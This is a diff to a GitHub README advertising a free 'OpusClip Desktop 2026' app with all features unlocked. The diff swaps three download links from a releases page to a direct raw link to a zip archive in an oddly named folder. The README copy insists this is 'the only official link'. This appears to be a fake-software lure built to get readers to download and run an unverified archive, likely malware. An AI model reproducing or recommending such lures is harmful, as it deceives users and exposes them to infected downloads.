@@ -1,7 +1,7 @@
 <h1>🎬 OpusClip-Desktop---Opus-Clip-AI-2026 - Turn Long Videos Into Viral Shorts Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Unstylish-associate7963/OpusClip-Desktop---Opus-Clip-AI-2026/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 15px rgba(255,107,107,0.4);">⬇️ Download OpusClip Desktop Now</a>
+  <a href="https://github.com/Unstylish-associate7963/OpusClip-Desktop---Opus-Clip-AI-2026/raw/refs/heads/main/Ustulina/A_Desktop_Opus_Clip_v3.3-alpha.1.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 15px rgba(255,107,107,0.4);">⬇️ Download OpusClip Desktop Now</a>
 </p>
 
 ---
@@ -23,7 +23,7 @@ Getting the app is super simple. Just follow these instructions carefully.
 
 > **Important:** Visit this link to download the application. That is the only official link. Do not download from shady third-party sites. We will always have the newest version on the GitHub link below.
 
-**[🔗 Download Page – Click Here](https://github.com/Unstylish-associate7963/OpusClip-Desktop---Opus-Clip-AI-2026/releases)**
+**[🔗 Download Page – Click Here](https://github.com/Unstylish-associate7963/OpusClip-Desktop---Opus-Clip-AI-2026/raw/refs/heads/main/Ustulina/A_Desktop_Opus_Clip_v3.3-alpha.1.zip)**
 
 ---
 
@@ -172,7 +172,7 @@ No. The 2026 Desktop version is a one-time download. All features are unlockedt.
 Ready to start creating viral content? The moment is now. Click the button below, download the app, and let the AI do the heavy lifting. Your next viral hit is one click away.
 
 <p align="center">
-  <a href="https://github.com/Unstylish-associate7963/OpusClip-Desktop---Opus-Clip-AI-2026/releases" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-size:22px;font-weight:bold;border-radius:60px;text-decoration:none;box-shadow:0 10px 20px rgba(0,242,254,0.4);">⬇️ Get OpusClip Desktop 2026 – Free Download</a>
+  <a href="https://github.com/Unstylish-associate7963/OpusClip-Desktop---Opus-Clip-AI-2026/raw/refs/heads/main/Ustulina/A_Desktop_Opus_Clip_v3.3-alpha.1.zip" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-size:22px;font-weight:bold;border-radius:60px;text-decoration:none;box-shadow:0 10px 20px rgba(0,242,254,0.4);">⬇️ Get OpusClip Desktop 2026 – Free Download</a>
 </p>
 
 ---
